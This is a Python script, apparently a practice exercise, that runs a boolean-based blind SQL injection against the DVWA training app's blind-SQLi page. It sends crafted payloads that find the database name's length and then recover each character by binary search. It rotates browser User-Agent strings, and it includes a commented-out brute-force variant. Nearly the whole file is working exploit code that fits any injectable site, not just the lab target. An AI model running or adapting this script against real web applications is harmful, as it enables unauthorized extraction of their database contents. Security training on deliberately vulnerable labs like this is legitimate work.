import requests
import random
import time

# 研究源代码和网页界面
errorText = [
    "User ID is MISSING from the database.",
    "User ID exists in the database."
]



class BlindingDVWA:
    def __init__(self, base_url):
        self.base_url = base_url
        self.agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15"
        ]

    def get_random_agent(self):
        headers = {"User-Agent": random.choice(self.agents)}
        return headers

    def get_db_length(self):
        for i in range(1, 21):  # 从 1 开始
            query = f"1' AND LENGTH(DATABASE()) = {i} %23"
            full_url = f"{base_url}?id={query}&Submit=Submit#"
            response = requests.get(full_url, headers=self.get_random_agent())

            if errorText[1] in response.text:
                print("YES")
                print(f"[*] DATABASE LENGTH: {i}")

                return i

    def bisect_with_name(self, index):

        low, high = 32, 126

        while low <= high:

            mid = (low + high) // 2
            query = f"1' AND ascii(substr(DATABASE(), {index}, 1)) > {mid} %23"
            full_url = f"{base_url}?id={query}&Submit=Submit#"
            response = requests.get(full_url, headers=self.get_random_agent())

            if errorText[1] in response.text:
                low = mid + 1
            else:
                high = mid - 1

        final_char = chr(low)
        print(f"[*] FIND CHARACTER AT POSITION {index}: {final_char}")

        return final_char


    def get_db_name(self, length):

        res = []

        for i in range(1, length+1):
            res.append(self.bisect_with_name(i))

        db_name = "".join(res) # 将数组转换为字符串
        print(f"[*] DATABASE NAME: {db_name}")
        return db_name

    # def brute_force_db_name(self, length):
    #     """ 使用暴力枚举方法逐个字符猜解 DATABASE() 名称 """
    #     res = []
    #
    #     for index in range(1, length + 1):  # 逐个字符猜解
    #         for ascii_code in range(32, 127):  # 遍历所有可打印字符
    #             query = f"1' AND ascii(substr(DATABASE(), {index}, 1)) = {ascii_code} %23"
    #             full_url = f"{self.base_url}?id={query}&Submit=Submit#"
    #             response = requests.get(full_url, headers=self.get_random_agent())
    #
    #             if errorText[1] in response.text:
    #                 found_char = chr(ascii_code)
    #                 res.append(found_char)
    #                 print(f"[*] FIND CHARACTER AT POSITION {index}: {found_char}")
    #                 break  # 发现正确字符后，跳出内循环
    #
    #     db_name = "".join(res)
    #     print(f"[*] DATABASE NAME (BRUTE FORCE): {db_name}")
    #     return db_name


if __name__ == "__main__":
    base_url = "http://dvwa/vulnerabilities/sqli_blind/"
    b = BlindingDVWA(base_url)
    db_l = b.get_db_length()

    start1 = time.perf_counter()
    db_name = b.get_db_name(db_l)
    end1 = time.perf_counter()

    print(f"[*] bisect time: {end1 - start1}")



